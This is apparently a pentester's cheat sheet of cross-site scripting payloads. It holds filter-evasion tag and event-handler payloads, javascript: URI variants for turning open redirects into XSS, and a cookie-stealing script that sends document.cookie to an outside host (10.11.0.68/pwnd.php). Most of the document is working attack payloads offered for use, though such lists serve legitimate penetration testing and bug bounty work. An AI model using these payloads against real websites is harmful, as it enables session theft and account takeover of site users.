# Cross-Site Scripting (XXS)

## Generic Payloads

* `<svg onload=alert%26%230000000040"1")>`
* `<x/oncut=alert(1)>a`
* `<body/onload=&lt;!--&gt;&#10alert(1)>`
* `<--`\<img/src= `onerror=alert(1)> --!>`
* `"><img src=x onerror=prompt(1);>`
* `--><script>alert('XSS PRESENT')</script>`
* `">script>alert(1)</script>`
* `<script>alert(document.cookie)</script>`

## Sending a Cookie

`<script>new Image().src="<http://10.11.0.68/pwnd.php?output=>"+document.cookie;</script>`

## Open Redirect to XSS payload list:

→ `javascript:alert(1)` → `%09Jav%09ascript:alert(1)` → `javascript://%250Alert(1)` → `/%09/javascript:alert(1);` → `//%5cjavascript:alert(1);` → `<>javascript:alert(1);` → `//javascript:alert(1);` → `\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)`

**Credit**: [https://twitter.com/beginnbounty/status/1555898799037743104?s=20\&t=zGK3\_NkYCyU1Xk\_uIss46Q](https://twitter.com/beginnbounty/status/1555898799037743104?s=20\&t=zGK3\_NkYCyU1Xk\_uIss46Q)
